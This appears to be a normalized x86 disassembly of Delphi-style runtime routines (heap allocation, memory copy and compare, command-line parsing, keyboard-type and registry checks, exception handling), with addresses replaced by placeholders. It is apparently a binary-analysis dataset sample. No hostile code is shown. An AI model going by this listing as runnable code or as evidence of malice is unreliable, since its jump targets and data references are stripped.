pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_402004
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401370
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403af0
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403af0
jmp r-xdata
sub_402288
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40241a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a0c
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401368
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401370
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403af0
jmp r-xdata
call sub_401ea0
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401bb0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e18
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401bb0
sub_40242c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401ea0
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401bb0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401fa4
test al al
je r-xdata
call sub_401bb0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c74
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e18
jmp r-xdata
sub_402608
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026b9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a0c
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40242c
test al al
je r-xdata
push rw-data
call sub_401368
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4020f8
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028c8
mov eax ebx
call sub_402288
retn
push rw-data
call sub_401370
sub_4026cc
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402828
sub_4026ec
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402828
sub_40270c
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402828
mov [ ecx ] eax
mov al 0x2
jmp sub_402828
retn
mov [ ecx ] eax
retn
sub_40279c
push ebx
push esi
call sub_405fa4
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405fa4
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405fa4
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027dc
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405fa4
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027d0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402864
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028c8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402908
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp al 0x20
jbe r-xdata
xor ebp ebp
mov edi ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_40122c
mov ebx eax
mov al [ ebx ]
cmp al 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp al 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_404654
mov ebx edi
mov edi [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_40122c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
push ebx
call sub_40122c
mov ebx eax
jmp r-xdata
mov al [ ebx ]
cmp al 0x20
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x22
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40122c
cmp eax ebx
jbe r-xdata
push ebx
call sub_40122c
mov ebx eax
jmp r-xdata
push ebx
call sub_40122c
mov ebx eax
jmp r-xdata
push ebx
call sub_40122c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40122c
mov ebx eax
jmp r-xdata
push ebx
call sub_40122c
cmp eax ebx
jbe r-xdata
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
sub_4029f4
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_404008
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_40126c
mov ecx eax
mov edx esp
mov eax ebx
call sub_4040f8
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_402908
mov edi eax
test esi esi
je r-xdata
sub_402a78
fld st0
sub esp 0x4
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
frndint
fwait
fldcw [ esp ]
add esp 0x4
fsubp st1
retn
sub_402aa8
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402ae8
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402854
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402b3c
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402854
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402854
jmp r-xdata
sub_402b94
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028c8
pop ebx
retn
mov ecx ebx
sub_402bb0
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402c34
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402ca4
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402cc4
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402da4
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402de4
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e97 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e97 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402e97
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_4030d0
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_403100
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012c4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403171
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012bc
retn
sub_4031f4
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_40329c
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4032f4
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404a38
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_403314
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_40588c
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_403344
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4033c8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4033d8
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4033cf
lea eax [ ebp - 0x8 ]
call sub_405874
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_403314
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40588c
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_4033d8
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_40341c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_4034a4
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40345c
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_40348c
push eax
push ecx
mov eax [ eax ]
call sub_40345c
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403ffc
call [ rw-data ]
sub_4034d4
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_40345c
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4034fc
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_40354c
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
xor ecx ecx
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov cx [ esi ]
add esi 0x2
mov eax [ eax ]
mov [ edi ] al
jmp r-xdata
add esi 0x6
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
mov bx [ esi ]
add esi ebx
dec ecx
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edx [ esi + 0x2 ]
je r-xdata
sub_40358c
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_4035dc
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_403605
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403670
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_4036ac
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4036c0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4036d4
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
